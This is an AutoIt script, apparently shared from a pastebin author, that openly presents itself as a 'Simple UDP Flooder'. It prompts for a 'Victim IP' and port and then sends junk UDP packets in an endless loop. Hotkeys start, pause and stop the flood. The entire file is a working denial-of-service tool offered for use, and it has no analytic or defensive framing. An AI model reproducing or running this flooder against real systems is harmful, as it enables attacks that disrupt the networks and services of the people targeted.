Global $nop
UDPStartup()
HotKeySet("{F8}", "Start")
HotKeySet("{F9}", "Stop")
HotKeySet("{F10}", "Bye")

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;; Author : G4eL ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

MsgBox(1, "Hi", "Simple UDP Flooder , AutoIT" & @CRLF & "By G4eL , http://pastebin.com/u/G4eL" & @CRLF & "F8 = Start , F9 = Stop , F10 = Exit")

$host = InputBox("Huhu","Victim IP " & @CRLF & " Example : 32.21.10.00", "")
$port = InputBox("Huhu","Victim Port " & @CRLF & " Random = 0", "")
$data1 = "4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444" & @CRLF & "4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444"

While 1
Sleep(100)
WEnd

Func Stop()
MsgBox(0, "Stop", "Stopped")
$nop = NOT $nop
While $nop
sleep(100)
WEnd
EndFunc

Func Bye()
exit 0
EndFunc

Func Start()
While 1
If $port == 0 Then
$sock1 = UDPOpen($host, Random(0, 65535, 1))
Else
$sock1 = UDPOpen($host, $port)
EndIf
UDPSend($sock1, $data1)
WEnd
EndFunc
